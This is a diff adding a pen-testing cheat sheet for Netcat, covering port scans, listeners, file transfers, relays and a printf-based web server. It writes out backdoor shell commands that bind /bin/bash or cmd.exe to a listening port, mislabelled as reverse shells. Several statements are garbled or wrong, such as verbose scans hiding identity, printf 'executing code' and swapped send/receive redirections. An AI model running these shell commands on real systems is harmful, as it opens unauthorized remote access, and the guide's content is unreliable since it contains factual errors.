@@ -1,0 +1,129 @@
+Netcat Self-Help Reference Guide by { Daily Investors }
+
+//What is Netcat??
+ Netcat is a multi-purpose scanner that offerers a varity of scans, transfers we can use in our Pen Testing.
+ 
+ 
+//Commands
+1. nc -help #Help
+2. nc -z -v site.com #Basic Port Scan
+3. nc -l #Starts your listner
+4. nc site.com 1234 (less than) file_name #Starts a file transfers
+5. Printf #Allows to save and execute code
+
+
+
+// Syntaxes
+Netcat Command Syntax
+1.All Netcat commands must start with the “nc” identifier or “netcat” for your Global caller.
+
+Different option parameters can be used, such as: “-u” for UDP traffic instead of TCP, “-v” for verbose output, “-p” to specify a specific port, and “-D” to turn on full debugging mode. 
+
+
+//Create a Chat and Server
+1. First need to enable netcat as your lister.
+2. nc -l -p 4444
+3. Now to launch your chat session, as Red Teams do across the world
+   nc localhost 1299
+   Netcat now will function as the web host and allow you to store HTML content 
+4. First, create a new text document on your local system and make sure to use valid HTML tags. Then save the file as “index.html”.
+5. Now "store" it in the root of your Netcat directory. 
+6. Finally switch back to the Netcat tool and run this command:
+
+printf ‘HTTP/1.1 200 OK\n\n%s’ “$(cat index.html)” | netcat -l 8999
+
+To see the HTML in action, simply open any web browser and navigate to your local IP address with: 8999 at the end to specify the port of the host.
+
+
+
+//Verbose Scanning
+1. Running a verbose scan, will not give away your identity
+2. -v #Verbose scan
+
+//Proxies
+1. Example: Port 80 is required for HTTP
+   1.printf “GET / HTTP/1.0\r\n\r\n” | nc google.com 80
+   
+//TCP Server && Client
+1.  TCP protocol is primarily used for transferring web traffic.
+2. It can be implemented at a local level for file transfers. To do this, you need to run Netcat from two locations: 
+   1.one that will act as a server to send the file and one that will act as the client to receive it.
+   Example: Run this Netcat command on the server instance to send the file over port 1499:
+	nc -l 1499 > filename.out
+	Then run this command on the client to accept, receive, and close the connection:
+	  nc server.com 1499 (less than) filename.in
+3. Make sure to replace “server.com” with IP address of the sending server  
+
+
+//Items
+1. To run a item transfer try:
+  1. file_path (pipe) device_path (pipe) network host
+  
+  
+//Prevent DNS Leakage
+1. -n # Informs to use DNS resolution or not
+
+//Automating
+1. Netcat can be automated, and ran in mass scripts
+2. Multiple Netcat commands can be grouped together in a single script and be run through either a Linux or Windows shell.
+3. Try to have the scripts on a regular timetable.
+
+//Reverse Backdoor Shells
+1. First, you need to enable the shell tool over a Netcat command by using Netcat reverse shell:
+   1.nc -n -v -l -p 5555 -e /bin/bash
+2. Now from any other system on the network, you can test your run commands on the host after successful a connection.
+   2. nc -nv 127.0.0.1 5555
+3. A reverse shell is a remote access approach to run administrative commands from one terminal to the next. 
+   To get started, you need to enable the shell tool over a Netcat command by using Netcat reverse shell:
+   3. nc -n -v -l -p 5555 -e /bin/bash
+4. Now you can access the other system.
+   4. nc -nv 127.0.0.1 5555
+   
+
+//Cheat Sheet
+1. Netcat Fundamentals
+   nc [options] [host] [port] – by default this will execute a port scan
+
+   nc -l [host] [port] – initiates a listener on the given port
+
+2. Netcat Command Flags
+   nc -4 – use IPv4 only
+
+   nc -6 – use IPv6
+
+   nc -u – use UDP instead of TCP
+
+   nc -k -l – continue listening after disconnection
+
+   nc -n – skip DNS lookups
+
+   nc -v – provide verbose output
+
+3. Netcat Relays on Windows
+   nc [host] [port] > relay.bat – open a relay connection
+   nc -l -p [port] -e relay.bat – connect to relay
+  
+4. Netcat Relays on Linux
+   nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe
+
+5. Netcat File Transfer
+   nc [host] [port] (greater than) file_name.out– send a file
+
+   nc [host] [port] (less than) file_name.in – receive a file
+
+5. Netcat Port Scanner
+   nc -zv site.com 80 – scan a single port
+
+   nc -zv hostname.com 80 84 – scan a set of individual ports
+
+   nc -zv site.com 80-84 – scan a range of ports
+   
+6. Netcat Banners
+   echo “” | nc -zv -wl [host] [port range] – obtain the TCP banners for a range of ports  
+
+7.  Netcat Backdoor Shells
+nc -l -p [port] -e /bin/bash – run a shell on Linux
+
+nc -l -p [port] -e cmd.exe – run a shell on Netcat for Windows
+
+8.  
